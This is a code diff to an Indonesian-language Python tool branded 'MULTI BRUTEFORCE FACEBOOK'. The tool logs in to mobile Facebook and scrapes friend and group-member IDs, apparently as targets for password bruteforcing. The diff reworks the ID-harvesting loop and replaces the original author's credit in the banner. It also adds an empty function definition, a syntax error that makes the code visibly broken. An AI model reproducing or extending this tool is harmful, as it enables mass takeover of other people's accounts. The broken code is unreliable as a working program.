@@ -240,8 +240,8 @@ def login():
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
 		buka('https://mobile.facebook.com/home.php')
-		nama = br.find_link(url_regex='logout.php').text
-		nama = re.findall(r'\((.*a?)\)',nama)[0]
+		nama = br.find_link(url_regex=None).text
+		#nama = re.findall(r'\((.*a?)\)',nama)[0]
 		cetak('!h[*] Selamat datang !k%s'%nama)
 		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
 		log = 1
@@ -250,6 +250,7 @@ def login():
 		keluar()
 	else:
 		cetak('!m[!] Login Gagal')
+def saring_id_group():
 def idgroup():
 	if log != 1:
 		cetak('!h[*] Login !bFB!h dulu bos...')
@@ -288,17 +289,17 @@ def idteman():
 	try:
 		next = br.find_link(url_regex='friends_center_main').url
 	except:
-		if len(id_teman) != 0:
+		if len(id_bteman) != 0:
 			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
 		else:
 			cetak('!m[!] Batal')
 			keluar()
 	while 1:
-		saring_id_teman(buka(next))
 		cetak('\r!h[*] !p%s !hid terambil...'%len(id_bteman),1)
 		sys.stdout.flush()
 		try:
 			next = br.find_link(url_regex='friends_center_main').url
+			saring_id_teman(buka(next))
 		except:
 			cetak('\n!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
 			break
@@ -309,7 +310,7 @@ def idteman():
 	else:
 		return menu()
 def menu():
-	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
+	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cROXY MIGURDIA\n !m* !cSpecial Thanks To @pirmansx\n !m* !phttps://github.com/RoxyMigurdia17\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
 	i = inputM('[?] PILIH',[1,2,3])
 	if i == 2:
 		lanjutG()
